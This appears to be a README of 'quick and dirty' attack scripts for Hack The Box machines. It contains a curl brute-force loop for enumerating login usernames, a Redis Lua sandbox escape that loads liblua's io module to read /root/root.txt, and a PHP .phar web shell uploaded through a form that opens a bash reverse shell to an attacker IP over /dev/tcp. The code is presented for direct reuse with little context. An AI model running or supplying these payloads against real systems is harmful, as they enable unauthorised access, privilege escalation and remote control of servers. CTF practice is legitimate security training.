# Quick and dirty scripts for HTB

Hack The Box is a hacking platform that provides various kinds of challenges and machines to hack. 😈

This repo discloses some manual scripts I had to write to get things done.

## Disclaimer

All my dirty scripts, and I can't insist more on the term "dirty", are provided for convenience. There's very little context and it's on purpose.

Indeed, **the idea is not give you a full writeup**.

Besides, you will likely find some ways to improve the code, as the idea is to get the desired information quick, but during a CTF, it's useless to look for the perfect script.

## All boxes

### Noter

The box will put your logic to the test.

At the beginning, to access the targeted backend, I needed this tiny Bash script:

```bash
for w in $(cat $1)
do
    r=$(curl -X POST -d "username=$w" -d "password=123" "http://$2/login")
    if [[ $r == *"Invalid login"* ]]; then
        echo "$w" > username.txt
        exit 0
    fi
    sleep .25 # in case of rate limiting
done
```

`$1` is for the path to your wordlist (for usernames), and `$2` is for the IP machine to attack.

It does not give you the password because we want to find the username here. I've read comments on the HTB forum that say you can find it without any brute force. Well, even if the username is in a notorious wordlist (not Rockyou), it's still pretty uncommon in such context.

### Shared

The box involves classic web exploitation, but the root flag requires hacking with Redis:

```sh
# hack.sh

redis-cli --pass "$1" eval 'local t = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = t(); local b = io.popen("cat /root/root.txt"); local s = b:read("*a"); b:close(); return s' 0;
```

Use it like that on the victim's machine: `sh hack.sh {REDIS_ROOT_PASSWORD_YOU_HACKED}`

[Source for inspiration](https://cn-sec.com/archives/1159396.html)

### Updown

This machine has classic HTTP/SSH config, nothing more, but a basic enumeration reveals "hidden" `.git/` dir in `/dev/` subfolder.

You can download the folder or use dedicated tools, such as GitHacker. One of the commits indicates a _fantastic_ technique used by the dev team to protect their vhost.
They use a classic subdomain you can found with any wordlist containing common subdomains (e.g., wfuzz, Gobuster). You might even guess it!

There's a form you need to abuse to upload a backdoor and pass arbitrary commands. It's possible because the form has an input for uploads and you have access to the code that processes the form in the git history. Many formats are disallowed but not `.phar`, which is a classic hack.

There are more work after that, but the payload to upload with the form looks like the following:

```php
<?php
// rs.phar
$descriptor_spec = array(
   0 => array( "pipe", "r" ),
   1 => array( "pipe", "w" ),
   2 => array( "file", "/tmp/errors.txt", "a" ),// stderr
);

$process = proc_open("bash", $descriptor_spec, $pipes, "/tmp");
// replace with your IP and listening port
fwrite($pipes[0], 'bash -i >& /dev/tcp/{YOUR_ATTACKER_IP}/{YOUR_PORT} 0>&1');
fclose($pipes[0]);
echo stream_get_contents($pipes[1]);
fclose($pipes[1]);
$return_value = proc_close($process);
echo "command returned $return_value\n";
?>
```

After that you can navigate to the uploaded .phar and get your shell.
